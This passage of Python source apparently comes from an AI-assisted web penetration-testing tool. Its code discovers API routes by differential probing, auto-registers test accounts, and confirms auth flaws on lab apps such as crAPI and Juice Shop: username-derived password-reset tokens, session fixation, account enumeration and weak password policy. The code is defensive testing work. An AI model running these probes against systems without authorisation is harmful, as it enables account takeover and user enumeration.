        code, and every one kept was proved by the target's own answer."""
        from .web import WebAction
        if self.browser is None:
            return []
        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/").rstrip("/")
        nonce = "brukal-absent-" + uuid.uuid4().hex[:10]

        def _fingerprint(url):
            try:
                # `run` returns (Decision, WebResult | None) — the result is None when
                # our own gate or limiter refused, which is not evidence about routing.
                # ROLE MATTERS: mount discovery is reconnaissance, and `probe` does not
                # hold the RECON capability — the gate refuses it, `run` returns no
                # result, and discovery would silently confirm nothing forever.
                _dec, r = self.browser.run(WebAction(kind="get", url=url), agent="recon")
            except Exception:
                return None
            if r is None:
                return None
            st = getattr(r, "status", None)
            if st is None:
                return None                   # our gate or limiter refused: not evidence
            return (st, len(getattr(r, "body", "") or ""))

        door = _fingerprint(f"{base}/{nonce}")
        if door is None:
            return []
        out = []
        for seg in list(candidates)[:cap]:
            seg = str(seg).strip("/")
            if not seg:
                continue
            fp = _fingerprint(f"{base}/{seg}/{nonce}")
            if fp is not None and fp != door:
                out.append(seg)
                self.note(f"[surface] mount CONFIRMED by request: /{seg} "
                          f"(answers {fp[0]}/{fp[1]}B where the front door answers "
                          f"{door[0]}/{door[1]}B)")
        return out

    def resolve_mounted_endpoints(self, suffixes: list, cap: int = 40) -> list:
        """Join CONFIRMED mounts to MINED suffixes, and prove every join by request.

        GAP #20 recovered the mounts (`"workshop/"`) and confirmed them. GAP #21 is that
        the endpoints were in the same bundle all along, UNROOTED —
        `"api/shop/orders"`, `"api/v2/user/dashboard"`, `"api/v2/coupon/validate-coupon"`
        — because the SPA concatenates mount + suffix at runtime. `_API_ROUTE_RE` requires
        a leading slash, so the miner was blind at BOTH ends of that join, and every CR1
        miss on an order, a coupon or a video was a miss on a path spelled out in full in
        a file the harness had already downloaded.

        Nothing here is invented. The mount came from the target's code and was confirmed
        by request; the suffix came from the target's code; the JOIN is confirmed too.
        An infix is never guessed — which is the failure this whole family of gaps is
        made of.

        Cost: a suffix belongs to ONE service, so the search stops at the first mount that
        answers. Fail-closed: a suffix that answers 404 under every confirmed mount is not
        written down, because a fabricated route in the grounding is what sent run 19's
        best experiment to a path that does not exist."""
        from .web import WebAction
        surface = getattr(self, "surface", None)
        if surface is None or self.browser is None:
            return []
        mounts = list(getattr(surface, "confirmed_mounts", []) or [])
        if not mounts:
            return []
        base = (getattr(surface, "seed", "") or f"http://{self.target}/").rstrip("/")
        confirmed = list(getattr(surface, "confirmed_routes", []) or [])

        # WHAT DOES THIS MOUNT SAY ABOUT A PATH THAT CANNOT EXIST? Without this, the rule
        # "any answer that is not 404 proves the route" confirmed all 32 mined suffixes
        # under /identity on the live target -- including /identity/api/shop/orders and
        # /identity/api/v2/coupon/validate-coupon, which live under /workshop and
        # /community. crAPI's identity service answers 401 for EVERY path under it,
        # existing or not, because its auth filter runs before routing. A blanket answer
        # is not evidence about a path; only a DIFFERENCE from it is. Same technique as
        # `discover_mounts`, one level down, and one baseline request per mount.
        absent: dict = {}
        for mount in mounts:
            nonce = "brukal-absent-" + uuid.uuid4().hex[:10]
            try:
                _d, rr = self.browser.run(
                    WebAction(kind="get",
                              url=f"{base}/{mount.strip('/')}/{nonce}"), agent="recon")
            except Exception:
                rr = None
            absent[mount] = (None if rr is None else
                             (getattr(rr, "status", None),
                              len(getattr(rr, "body", "") or "")))

        out, spent = [], 0
        # ENDPOINTS CLUSTER BY SERVICE. Alphabetical order put `chatbot` first for every
        # suffix in a free run — 109 composed probes and 48 of our own rate-limit denials,
        # most of them spent on a service nothing lives under. Once a mount has answered,
        # it is the best-evidenced guess for the next suffix, and that evidence comes from
        # this run rather than from an assumption about how APIs are laid out.
        hits: dict = {}
        for sfx in list(suffixes)[:cap]:
            sfx = str(sfx).strip("/")
            if not sfx:
                continue
            for mount in sorted(mounts, key=lambda m: -hits.get(m, 0)):
                path = f"/{mount.strip('/')}/{sfx}"
                if path in confirmed:
                    break
                try:
                    _dec, r = self.browser.run(
                        WebAction(kind="get", url=f"{base}{path}"), agent="recon")
                except Exception:
                    _dec, r = None, None
                spent += 1
                # OUR SILENCE IS NOT THE TARGET'S. A gate denial — `hard:web-rate` above
                # all — a transport failure, or a cage that never ran the request all come
                # back the same shape a 404 does. GAP #8 paid for this once: run 14's own
                # limiter denied the dashboard probes and crAPI's whole identity surface
                # was written off as absent without the target being asked. The first
                # version of THIS method repeated it — a free local run showed 48
                # `hard:web-rate` denials, 12 of them on composed probes, each silently
                # abandoning a suffix while the sweep kept spending the very allowance
                # that refused it.
                #
                # So a refusal STOPS the sweep whole. What is left untried stays
                # untried, and a later pass can ask: untried is recoverable, written-off
                # is not.
                if self._we_refused(_dec, r):
                    self.note("[surface] endpoint resolution STOPPED — our own gate or "
                              "limiter refused a probe; the remaining suffixes are left "
                              "UNTRIED rather than written off as absent")
                    return out
                st = getattr(r, "status", None)
                fp = (st, len(getattr(r, "body", "") or ""))
                # Proof is a DIFFERENCE from what this mount says about an impossible
                # path -- not merely "not a 404". A 405 still means the route is there but
                # not for GET, which is what the `[not-GET]` label exists for.
                base_fp = absent.get(mount)
                if st is not None and st != 404 and (base_fp is None or fp != base_fp):
                    out.append(path)
                    confirmed.append(path)
                    if path not in surface.confirmed_routes:
                        surface.confirmed_routes.append(path)
                        if st == 405:
                            (surface.route_methods or {}).setdefault(path, "not-GET")
                    hits[mount] = hits.get(mount, 0) + 1
                    self.note(f"[surface] endpoint CONFIRMED by request: {path} "
                              f"(HTTP {st}) — mount and suffix both came from the app's "
                              f"own bundle")
                    break                      # a suffix belongs to one service
        return out

    def resolve_mined_routes(self, cap: int = 40) -> list:
        """Resolve mined route FRAGMENTS to paths this target actually answers.

        THE DEFECT (CR1 pre-flight 2, crAPI, 2026-09-17). A bundle yields the paths a
        single-page app uses on the client; an application behind a gateway mounts them
        under a service prefix, and mining loses it. Every mined route 404'd: signup was
        tried at `/REGISTER` and `/auth/signup` while the endpoint that works is
        `/identity/api/auth/signup`. B3 and B8 failed on that and nothing else.

        `summary()` ALREADY said "UNVERIFIED — the mount prefix may be missing". The model
        read the sentence and proposed against those paths anyway, and
        `_json_signup_candidates` consumed them as real URLs. **A caveat in prose that no
        code enforces is a comment, not a safeguard** — so the caveat is now a step.

        Two halves, and neither guesses:
          1. the prefix is ALIGNED against a path that already answered (the login URL,
             or anything the crawl fetched) — see `webmap.align_mount_prefixes`;
          2. every composed path is CONFIRMED by one gated request before anything uses
             it. Never act on a derived fact that has not been confirmed against the
             target once.

        Fail-closed twice over: a target with no learnable prefix resolves nothing and
        spends no requests (Juice Shop), and a soft-404 target resolves nothing because a
        confirmation there proves nothing — every composition would "pass".
        """
        from . import webmap
        from .web import WebAction
        surface = getattr(self, "surface", None)
        if surface is None or self.browser is None:
            return []
        if getattr(surface, "soft_404", False):
            self.note("[crawl] route resolution SKIPPED: this host answers 200 for paths "
                      "that do not exist, so a confirmation would prove nothing")
            return []
        # THE MOUNTS FIRST, and only once. Everything below composes fragments against
        # prefixes ALIGNED from paths that answered — which on a multi-service gateway can
        # only ever learn the service the operator's login URL points at. crAPI has four,
        # and nineteen runs saw one. Confirming the mounts the application NAMES, and then
        # the endpoint suffixes it names, turns the other three from invisible into
        # proved. Both steps are request-confirmed and fail closed.
        try:
            if (getattr(surface, "mount_candidates", None)
                    and not getattr(surface, "confirmed_mounts", None)):
                surface.confirmed_mounts = self.discover_mounts(
                    sorted(surface.mount_candidates))
            # EVERY PASS, not just the one that discovered the mounts. A sweep stops the
            # moment our own limiter refuses it and leaves the rest UNTRIED — which is
            # only recoverable if something comes back for them. Wiring this inside the
            # discovery block made "untried" mean "never", and a free run proved it: the
            # first refusal ended endpoint resolution for the whole engagement, 0
            # confirmed. Resolution already runs whenever new evidence arrives, so the
            # remainder is picked up there, a bounded slice at a time.
            if getattr(surface, "confirmed_mounts", None) and getattr(
                    surface, "api_suffixes", None):
                _done = set(getattr(surface, "confirmed_routes", []) or [])
                _left = [x for x in sorted(surface.api_suffixes)
                         if not any(r.endswith("/" + x) for r in _done)]
                if _left:
                    self.resolve_mounted_endpoints(_left)
        except Exception as exc:
            self.note(f"[surface] mount discovery failed and was skipped "
                      f"({type(exc).__name__}: {str(exc)[:100]})")

        fragments = list(getattr(surface, "api_routes", []) or [])
        # YIELD TO THE PRINCIPALS. The full sweep costs a probe per fragment plus a
        # composition per prefix, and in CR1 runs 7 and 8 it spent the web-rate allowance
        # that the SECOND PRINCIPAL'S IDENTITY PROBES needed — /me, /api/user/me and
        # crAPI's own /identity/api/v2/user/dashboard were all denied `hard:web-rate`,
        # and both runs finished with that principal unconfirmed. `_establish_principals`
        # already documents this exact failure from the 2C3 pre-flights: "the cheapest and
        # most load-bearing acquisition in the engagement was queued behind the most
        # expensive sweep."
        #
        # It cannot simply be deferred — establishment READS these routes, and GAP #4 was
        # that crAPI's signup endpoint was unreachable until its prefix was learned. So
        # the pre-establishment pass is NARROWED to what establishment actually needs, and
        # the rest waits until the principals are in hand.
        if not getattr(self, "_principals_established", False):
            _login_ish = ("/login", "/signin", "/session", "/auth", "/token")
            # ESTABLISHMENT ALSO NEEDS THE ORACLE. Confirming a principal's identity is
            # part of acquiring it, and on a target whose oracle sits under a mount — the
            # common case — it is unreachable until its fragment is resolved. Leaving it
            # out made the identity of every principal unconfirmable on any target whose
            # oracle is not hard-coded in the allowlist, which is the portability smell
            # this narrowing would otherwise have made permanent.
            _oracle_ish = tuple(_IDENTITY_PROBE_PATHS)
            def _rank(frag):
                low = frag.split("?")[0].rstrip("/").lower()
                # SIGNUP FIRST. Establishment needs a registration endpoint; the login URL
                # is supplied by the operator. A budget spent on login shapes is a budget
                # that did not reach the one route the second principal depends on, which
                # is how the first version of this narrowing resolved /login and stopped.
                if any(low.endswith(s) for s in _JSON_SIGNUP_PATHS):
                    return 0
                if any(low.endswith(s) for s in _login_ish):
                    return 1
                if any(low.endswith(s) for s in _oracle_ish):
                    return 2
                return 3
            fragments = sorted([f for f in fragments if _rank(f) < 3], key=_rank)
            cap = min(cap, 16)
        observed = [p for p in (getattr(surface, "pages", set()) or set())]
        if getattr(self, "_login_url", ""):
            observed.append(self._login_url)
        # EVERYTHING THAT ANSWERED, not just the login URL — see `_observe_answer`.
        observed.extend(getattr(self, "_answered_paths", None) or [])
        # ALIGN AGAINST EVERYTHING EVER MINED, not only what survives. Resolution
        # REPLACES a fragment with its composed form, so after one pass `/auth/login` has
        # become `/identity/api/auth/login` — identical to the observed path it was
        # aligned against, and alignment requires the observed path to be LONGER. The
        # anchor destroys itself, and a second pass learns nothing.
        anchors = getattr(self, "_mined_fragments", None)
        if anchors is None:
            anchors = self._mined_fragments = set()
        anchors.update(fragments)
        anchors.update(getattr(surface, "api_routes", []) or [])
        prefixes = webmap.align_mount_prefixes(observed, sorted(anchors))
        if not prefixes:
            return []
        base = getattr(surface, "seed", "") or f"http://{self.target}/"
        from urllib.parse import urljoin as _urljoin
        known = set(fragments)
        # Compositions already disproved. Re-resolution runs whenever new evidence
        # arrives, and must not re-spend a request on a path the target already denied.
        tried = getattr(self, "_composed_tried", None)
        if tried is None:
            tried = self._composed_tried = set()
        # EVIDENCE TAKEN IN ONE STATE MUST NOT BIND JUDGEMENT IN ANOTHER. Probes made
        # before the principals were acquired ran with a different session — and on a
        # target whose endpoints answer by principal, a 404 then is not a 404 now. Left
        # permanent, one early miss silently excluded a route for the rest of the run:
        # run 14 confirmed thirteen routes and not the dashboard, which a direct replay
        # of the same sequence confirms without trouble.
        #
        # So the pre-establishment probes are discarded once, at the moment the state
        # they were taken in stops being the state we are in. The absent-signatures go
        # with them for the same reason: a control taken as a stranger cannot judge a
        # candidate probed as us.
        if getattr(self, "_principals_established", False) and not getattr(
                self, "_probes_requalified", False):
            self._probes_requalified = True
            tried.clear()
            self._absent_sigs = {}
        resolved, budget = [], cap
        # A control probe is a request like any other and is billed against the same
        # budget, or the documented cap quietly becomes cap + one per mount point.
        _sigs_before = len(getattr(self, "_absent_sigs", None) or {})
        for frag in fragments:
            if budget <= 0:
                break
            # IS THE BARE FRAGMENT ALREADY A ROUTE? Composing assumed it was not, and
            # replaced it with the composed form — which on an application that answers
            # broadly rewrote CORRECT routes into wrong ones (caught by test_loop_e2e,
            # where /users/v1/{username} became /books/users/v1/{username}).
            #
            # So the assumption is measured instead: one gated probe. If the fragment
            # answers, it IS the route, it is confirmed as-is, and nothing is composed —
            # which also saves every composition that would have followed.
            budget -= (len(getattr(self, "_absent_sigs", None) or {}) - _sigs_before)
            _sigs_before = len(getattr(self, "_absent_sigs", None) or {})
            if budget <= 0:
                break
            bare = "/" + frag.strip("/")
            # A FRAGMENT ALREADY PROVEN NEEDS NOTHING. Resolution rewrites a fragment to
            # its composed form, so on a later pass the fragment IS the resolved path —
            # its bare probe is in `tried`, the probe is skipped, and control used to
            # fall straight through to the composition loop. That loop skipped only the
            # prefix the path already carries, so every OTHER mount was composed onto a
            # route we had already proven (run 16, live:
            # /workshop/api/shop/identity/api/v2/user/dashboard). Real gated requests,
            # every pass, for every resolved route times every mount — spent against the
            # same rate allowance whose exhaustion cost run 14 that very route.
            # PROVEN, not merely mined: `known` is the fragment list itself, so testing
            # against it skips every fragment on the first pass and resolves nothing.
            if bare in (surface.confirmed_routes or ()):
                continue
            if bare not in tried:
                tried.add(bare)
                budget -= 1
                try:
                    # AS SELF, EXPLICITLY. These probes used to inherit whatever principal
                    # state the browser happened to hold. crAPI's dashboard is a
                    # header-reading oracle -- 404 to a stranger, 200 to us -- so the same
                    # endpoint was "absent" or "present" depending on when the sweep ran,
                    # and confirmed-route counts on one target swung 2, 3, 11, 24, 25
                    # across runs. Run 13's cost: the oracle went unconfirmed, the model
                    # kept proposing the unprefixed path, and four requests 404'd.
                    with self._as_identity("self", "probe", _urljoin(base, bare)):
                        _bd, br = self.browser.run(WebAction(
                            "request", method="GET", url=_urljoin(base, bare)))
                except Exception:
                    _bd, br = None, None
                # OUR REFUSAL IS NOT THEIR ANSWER. Forget that we tried and stop the
                # sweep: the remaining fragments are better left untried for a later
                # pass than written off by a rate limiter that never asked the target.
                if self._we_refused(_bd, br):
                    tried.discard(bare)
                    break
                _bs = getattr(br, "status", None)
                if self._route_exists(bare, _bs):
                    if bare not in surface.confirmed_routes:
                        surface.confirmed_routes.append(bare)
                    # KEEP THE OTHER HALF of what the probe just learned.
                    surface.route_methods[bare] = "not-GET" if _bs == 405 else "GET"
                    continue
            for prefix in prefixes:
                # A PREFIX IS NEVER COMPOSED ONTO ITSELF. Resolution replaces a fragment
                # with its composed form, so on the next pass the fragment already
                # carries the prefix and this produced /identity/api/identity/api/...,
                # a path that cannot exist — one gated request each, billed against the
                # same cap that decides whether later fragments are probed at all.
                if bare == prefix or bare.startswith(prefix.rstrip("/") + "/"):
                    continue
                composed = prefix + ("/" + frag.strip("/"))
                if composed in known or composed in tried or budget <= 0:
                    continue
                tried.add(composed)
                budget -= 1
                try:
                    with self._as_identity("self", "probe", _urljoin(base, composed)):
                        _cd, r = self.browser.run(WebAction(
                            "request", method="GET", url=_urljoin(base, composed)))
                except Exception:
                    _cd, r = None, None
                if self._we_refused(_cd, r):
                    tried.discard(composed)
                    budget = 0                 # ends the sweep; the next pass retries
                    break
                status = getattr(r, "status", None)
                if not self._route_exists(composed, status):
                    continue
                # It answered. Replace the dead fragment rather than keeping both: a
                # fragment that 404s is a lead the model will keep spending steps on.
                surface.api_routes = [composed if x == frag else x
                                      for x in surface.api_routes]
                if composed not in surface.confirmed_routes:
                    surface.confirmed_routes.append(composed)
                surface.route_methods[composed] = "not-GET" if status == 405 else "GET"
                known.add(composed)
                resolved.append((frag, composed))
                # THE MAP, kept for proposal repair. Resolution PROVED this fragment lives
                # at this path; a later proposal naming the fragment is not wrong about
                # what to test, only about where it is.
                rmap = getattr(self, "_resolved_map", None)
                if rmap is None:
                    rmap = self._resolved_map = {}
                rmap[frag] = composed
                break
        if resolved:
            self.note(f"[crawl] resolved {len(resolved)} mined route(s) under this app's "
                      f"own mount prefix {prefixes[0]} and CONFIRMED each by request: "
                      + ", ".join(c for _f, c in resolved[:6]))
        return resolved

    def _json_signup_candidates(self) -> list:
        """Registration URLs worth trying, from the CRAWL, filtered by the allowlist.

        Two halves, and both matter. The crawl half means we only ever post to something
        the application itself advertised. The allowlist half means we do not post to
        every route it advertised — a real surface mines dozens, and a speculative POST
        at an arbitrary one is exactly the kind of unrequested state change this project
        refuses to make."""
        from urllib.parse import urljoin as _urljoin
        surface = getattr(self, "surface", None)
        if surface is None:
            return []
        base = getattr(surface, "seed", "") or f"http://{self.target}/"
        seen, out = set(), []
        # DERIVED FROM THE OPERATOR'S LOGIN ENDPOINT, first and unconditionally. The
        # operator named where auth lives (--login-url); its signup sibling is the SAME
        # authorised surface, and on an API/SPA the crawl often never surfaces a signup
        # route at all — which lost a live crAPI run its entire second principal (every
        # cross-account experiment recorded `second_unavailable`) even though the auth
        # mount had been named. This does not depend on crawl timing and is not a
        # speculative POST at an arbitrary route: it is the documented sibling of a route
        # the operator authorised, and it is still gated and in-scope like every request.
        login_url = (getattr(self, "_operator_login_url", "")
                     or getattr(self, "_login_url", "") or "")
        if login_url:
            from urllib.parse import urlsplit as _urlsplit
            _sp = _urlsplit(login_url)
            _segs = [seg for seg in _sp.path.split("/") if seg]
            if _segs and _segs[-1].lower() in (
                    "login", "signin", "log-in", "sign-in", "authenticate", "session"):
                # Only the `signup` sibling — a login mount's registration sibling is
                # `signup` on every API this is aimed at (crAPI, Juice Shop). A speculative
                # `register` sibling would more often 404 than exist, and a 404 candidate
                # tried here would clobber the far more useful "registered but could not log
                # in" refusal from a real endpoint. The crawl still surfaces a `/register`
                # for the apps that use it.
                _cand = f"{_sp.scheme}://{_sp.netloc}/" + "/".join(_segs[:-1] + ["signup"])
                if _cand not in seen:
                    seen.add(_cand)
                    out.append(_cand)
        # CONFIRMED ROUTES FIRST. A live crAPI run lost its second principal — and with it
        # ten `state_changed` experiments, recorded `second_unavailable` — by posting at
        # `/REGISTER`, an unprefixed mined fragment, while `/identity/api/auth/signup` had
        # ALREADY been confirmed by request and was sitting in the same surface. That is
        # GAP #10's shape one consumer along: the knowledge was there and the chooser was
        # reading the unverified tier. A route the target itself answered outranks a
        # fragment somebody mined.
        for route in list(getattr(surface, "confirmed_routes", []) or []) \
                + list(getattr(surface, "api_routes", []) or []) \
                + [p for p in (getattr(surface, "pages", {}) or {})]:
            if not route or "{" in route:
                continue
            path = route.split("?", 1)[0].rstrip("/").lower()
            if not any(path.endswith(shape) for shape in _JSON_SIGNUP_PATHS):
                continue
            url = _urljoin(base, route)
            if url not in seen:
                seen.add(url)
                out.append(url)
        return out

    def _register_account_json(self):
        """Create a fresh account through a JSON registration endpoint, or None.

        The form path is preferred and tried first: an account made through the app's own
        `<form>` is self-evidently what a stranger gets. An SPA has no form to use, and
        without this the entire cross-account class was unreachable there — the model
        proposed the right experiments and none of them could be constructed.

        Same soundness argument, same front door: this posts to an endpoint the
        application advertised to an anonymous crawler, as an anonymous caller, and takes
        whatever role it is given. Returns (identifier, password) — the identifier is the
        EMAIL, because a JSON signup authenticates by email where a form usually does not.

        Goes through `self.browser`, so it is gated by `check_web` and lands in the audit
        like every other web action (invariant 4). Nothing here builds its own HTTP."""
        from .web import WebAction
        if self.browser is None or not self.allow_intrusive:
            return None
        candidates = self._json_signup_candidates()
        if not candidates:
            return None
        import uuid as _uuid
        tag = _uuid.uuid4().hex[:10]
        email, password = f"brk{tag}@brukal.test", "Brukal-Signup-1!"
        # The minimum a JSON signup asks for, plus the confirmation field the common ones
        # want. Confirmed live against Juice Shop v20.2.0 on 2026-08-22: {email, password}
        # alone answers 201. Extra keys are ignored by every implementation seen so far,
        # and a required field we do not send shows up as a 4xx, which is a clean refusal
        # rather than a silent half-created account.
        base = {"email": email, "password": password,
                "passwordRepeat": password, "username": f"brk{tag}"}
        for url in candidates:
            # ASK, DO NOT GUESS. The minimal body goes first — it is what Juice Shop and
            # every endpoint like it accepts, so the common case is still one request. A
            # refusal that NAMES its missing fields (crAPI's does: "on field 'number'")
            # is read deterministically and the named fields are added. An endpoint that
            # names nothing gets no guess: fail closed, record why.
            fields, r = dict(base), None
            for _round in range(_SIGNUP_MAX_ROUNDS):
                try:
                    _d, r = self.browser.run(WebAction(
                        "request", url=url, method="POST", body=json.dumps(fields),
                        headers={"Content-Type": "application/json"}))
                except Exception:
                    r = None
                    break
                if r is None or (r.status or 0) < 400:
                    break
                wanted = signup.missing_fields(r.body or "", already=set(fields))
                if not wanted:
                    # MISSING and INVALID are different refusals. Nothing to ADD does not
                    # mean nothing to fix: crAPI HAD `name` and would not accept that
                    # value, said so by field and constraint, and this loop gave up
                    # because `missing_fields` correctly skips a field we already sent.
                    # Ten `state_changed` experiments died `second_unavailable` behind a
                    # value four characters too short.
                    repaired = signup.rejected_fields(r.body or "", already=set(fields))
                    if repaired:
                        for _f, _constraint in repaired:
                            fields[_f] = signup.repair_value(
                                _f, _constraint, current=str(fields.get(_f, "")))
                        self.note(f"[experiment] signup at {url} refused "
                                  f"{[f for f, _ in repaired]} by value; repairing from "
                                  f"the constraint the target named and retrying")
                        continue
                    self.signup_refusal = (
                        f"signup at {url} refused with {r.status} and its error named no "
                        f"field we could supply: {(r.body or '')[:160]}")
                    # Noted HERE, where the cause is known. The caller notes the
                    # consequence; this line is the reason, and without it a run shows a
                    # missing second principal with no explanation anywhere.
                    self.note("[experiment] second principal NOT established — "
                              + self.signup_refusal)
                    break
                for name in wanted:
                    fields[name] = signup.synth_value(name, tag)
            else:
                # The loop ran its full length and the endpoint was still naming fields.
                self.signup_refusal = (
                    f"signup at {url} kept naming further required fields after "
                    f"{_SIGNUP_MAX_ROUNDS} attempts (last added: "
                    f"{sorted(set(fields) - set(base))}) — stopped rather than keep "
                    f"POSTing at a registration endpoint")
                self.note("[experiment] second principal NOT established — "
                          + self.signup_refusal)
            if r is None or (r.status or 0) >= 400 or (r.status or 0) < 200:
                continue
            # A 2xx that did not create anything is common on SPA catch-alls, which
            # answer 200 with the index page for every unknown path. So a 2xx alone is
            # not proof — but demanding ONE FORM of proof is how crAPI's two real accounts
            # were thrown away (CR1 pre-flight 3): its reply is
            # {"message":"User registered successfully! Please Login."}, and the echo that
            # Juice Shop happened to provide had quietly become the definition of an
            # account existing.
            #
            # EVIDENCE LADDER, cheapest first. Anything that ESTABLISHES the account is
            # accepted; nothing that merely looks encouraging is.
            text = (r.body or "")
            if "<html" in text[:200].lower():
                continue                       # an index page is not a registration reply
            try:
                got = json.loads(text)
            except Exception:
                got = None
            if got is not None and email in json.dumps(got):
                # RUNG 1 — the application names the account back. No extra request, and
                # it is the only response that describes the new principal, so its
                # identifiers are learned here.
                self.note(f"[experiment] second principal registered via JSON signup at "
                          f"{url} — existence named by the application")
                self._record_principal_ids("second", "signup", text)
                return email, password
            # RUNG 2 — USE IT. Logging in as the account is stronger evidence than any
            # echo, and the caller was about to do it anyway; doing it here means a target
            # that answers a message instead of an object is no longer indistinguishable
            # from one that refuses to register at all.
            if self._login_proves_account(email, password):
                self.note(f"[experiment] second principal registered via JSON signup at "
                          f"{url} — existence proved by login (the reply named no account)")
                return email, password
            self.signup_refusal = (
                f"signup at {url} answered {r.status} but the account could not be "
                f"proved: the reply named no account and we could not log in as it")
            self.note("[experiment] second principal NOT established — " + self.signup_refusal)
        return None

    def confirm_predictable_reset_token(self, reset_url: str, id_param: str,
                                        token_param: str, known_user: str) -> bool:
        """A password-reset token DERIVED from the username (OWASP API2 / A07).

        Brukal already had this one and did not look: its own engagement log recorded
        `credential — * [Sample reset link](/resetpw?login=user&token=ee11cbb1…)`, and
        ee11cbb19052e40b07aac0ca060c23ee is md5("user"). A competing tool tested it and
        reported zero-interaction takeover of any known account.

        Nothing here needs an observed token. A token that is a digest of the username
        can simply be COMPUTED for an account we already control, and the differential
        does the rest: the derived value is accepted where a random one of the same
        shape is refused. Read-only, and aimed at our own account — the impact sentence
        generalises to other users, the request never touches one."""
        import hashlib

        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not (reset_url and known_user):
            return False
        digests = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256}
        control_token = "0" * 32            # right shape, cannot be anybody's digest

        def fetch(token: str):
            url = self._set_param(self._set_param(reset_url, id_param, known_user),
                                  token_param, token)
            try:
                _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
            except Exception:
                return None
            return r

        control = fetch(control_token)
        if control is None or control.status is None:
            return False
        for name, fn in digests.items():
            if getattr(self, "_confirm_budget", 1) <= 0:
                return False
            if getattr(self, "_confirm_budget", None) is not None:
                self._confirm_budget -= 1
            derived = fn(known_user.encode("utf-8", "replace")).hexdigest()
            got = fetch(derived)
            if got is None or got.status is None:
                continue
            # The comparison IS the proof. A page that answers everything identically
            # proves nothing, and a token guessed right by accident is not a 1-in-2^128
            # event worth reporting on one sample.
            if got.status == control.status:
                continue
            self.findings.add(Finding(
                title="Password reset token is derived from the username",
                severity="critical", category="auth",
                target=reset_url, param=token_param, confirmed=True,
                evidence=(f"{name}({known_user}) = {derived} was accepted "
                          f"(HTTP {got.status}) while a random token of the same shape "
                          f"was refused (HTTP {control.status}) — the token carries no "
                          f"secret, so it can be computed for any account whose "
                          f"username is known"),
                source=(f"GET {reset_url}?{id_param}={known_user}&{token_param}="
                        f"{name}({known_user}) vs the same URL with {control_token}")))
            self.note(f"[confirm] reset token is {name}(username) on {reset_url}")
            return True
        return False

    def confirm_session_fixation(self, login_url: str, username: str,
                                 password: str) -> bool:
        """The session identifier is not rotated when privilege changes (CWE-384).

        A competitor reported this on a target where Brukal had no check for it at all.
        The flaw is that an attacker who can plant a session id in a victim's browser —
        via a link, a subdomain cookie, an XSS — still holds a valid one after the victim
        logs in, because the application kept the same identifier and merely attached an
        identity to it.

        Deterministic and read-only: take the identifier a stranger is given, log in with
        it, and see whether the identifier survived. No guessing and no payload — the
        application either issues a new one or it does not."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not (login_url and username and password):
            return False
        with self._separate_identity():
            try:
                self.browser.run(WebAction("request", url=login_url, method="GET"))
            except Exception:
                return False
            before = dict(getattr(self.browser, "_cookies", {}) or {})
            if not before:
                return False              # no pre-auth session to fixate
            if not self.login(login_url, username, password):
                return False
            after = dict(getattr(self.browser, "_cookies", {}) or {})
        kept = [k for k, v in before.items()
                if k in after and after[k] == v and len(str(v)) >= 8]
        if not kept:
            return False                  # rotated: correct behaviour
        name = kept[0]
        self.findings.add(Finding(
            title="Session identifier not rotated on login (session fixation)",
            severity="high", category="auth",
            target=login_url, param=name, confirmed=True,
            evidence=(f"the value of '{name}' issued to an anonymous visitor was still "
                      f"the session identifier after a successful login, so an "
                      f"identifier planted in a victim's browser before they "
                      f"authenticate remains valid afterwards and carries their "
                      f"privileges"),
            source=(f"GET {login_url} as a stranger, record '{name}', POST the "
                    f"credentials, compare '{name}' again")))
        self.note(f"[confirm] session identifier '{name}' survives login on {login_url}")
        return True

    def confirm_recovery_enumeration(self, recovery_url: str, known_user: str,
                                     field: str = "login") -> bool:
        """The password-recovery form tells a stranger which accounts exist.

        Brukal already asks this of the LOGIN endpoint. A competitor found it on the
        recovery endpoint instead, which is a different handler, is usually written with
        less care, and is reachable without any credential at all. Same differential
        discipline: an account we know exists against one that cannot, and only a
        difference in the answers is evidence."""
        import uuid as _uuid

        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not (recovery_url and known_user):
            return False
        absent = f"brukal-{_uuid.uuid4().hex[:10]}@example.invalid"

        def ask(value: str):
            from urllib.parse import urlencode
            with self._separate_identity():
                try:
                    _d, r = self.browser.run(WebAction(
                        "request", url=recovery_url, method="POST",
                        body=urlencode({field: value}),
                        headers={"Content-Type": "application/x-www-form-urlencoded"}))
                except Exception:
                    return None
            return r

        real, fake = ask(known_user), ask(absent)
        if real is None or fake is None:
            return False
        real_loc = (real.headers or {}).get("Location", "") or (real.headers or {}).get("location", "")
        fake_loc = (fake.headers or {}).get("Location", "") or (fake.headers or {}).get("location", "")
        differs = (real.status != fake.status) or (real_loc != fake_loc)
        if not differs:
            # Bodies too, with the submitted values removed so an echo cannot fake it.
            stripped_real = (real.body or "").replace(known_user, "")
            stripped_fake = (fake.body or "").replace(absent, "")
            differs = _norm_ws(stripped_real) != _norm_ws(stripped_fake)
        if not differs:
            return False
        self.findings.add(Finding(
            title="Account enumeration via the password recovery endpoint",
            severity="medium", category="auth",
            target=recovery_url, param=field, confirmed=True,
            evidence=(f"a recovery request for an account that exists was answered "
                      f"differently (HTTP {real.status}{' -> ' + real_loc if real_loc else ''}) "
                      f"from one that cannot exist (HTTP {fake.status}"
                      f"{' -> ' + fake_loc if fake_loc else ''}), so an unauthenticated "
                      f"stranger can test any address for membership"),
            source=(f"POST {recovery_url} with {field}={known_user} versus the same "
                    f"request with a random address")))
        self.note(f"[confirm] recovery endpoint enumerates accounts: {recovery_url}")
        return True

    def confirm_weak_password_policy(self) -> bool:
        """The server accepts a password no policy would allow (CWE-521).

        Not a guess about strength rules: it registers a real account through the app's
        own signup form with a trivially weak secret and reports only if the account is
        actually created. What makes it worth reporting alongside the rest is that every
        rate-limit and enumeration flaw becomes materially cheaper to exploit when the
        passwords behind them are guessable."""
        from urllib.parse import urlencode

        from .findings import Finding
        from .web import WebAction
        form = self._signup_form()
        if form is None or self.browser is None or not self.allow_intrusive:
            return False
        import uuid as _uuid
        weak = "1"
        tag = _uuid.uuid4().hex[:10]
        user = f"brkw{tag}"
        body = {}
        for field, ftype in (getattr(form, "inputs", []) or []):
            if (ftype or "").lower() == "file":
                continue
            role = ""
            for name, rx in self._FIELD_ROLES:
                if rx.search(field):
                    role = name
                    break
            if not role and (ftype or "").lower() == "password":
                role = "password"
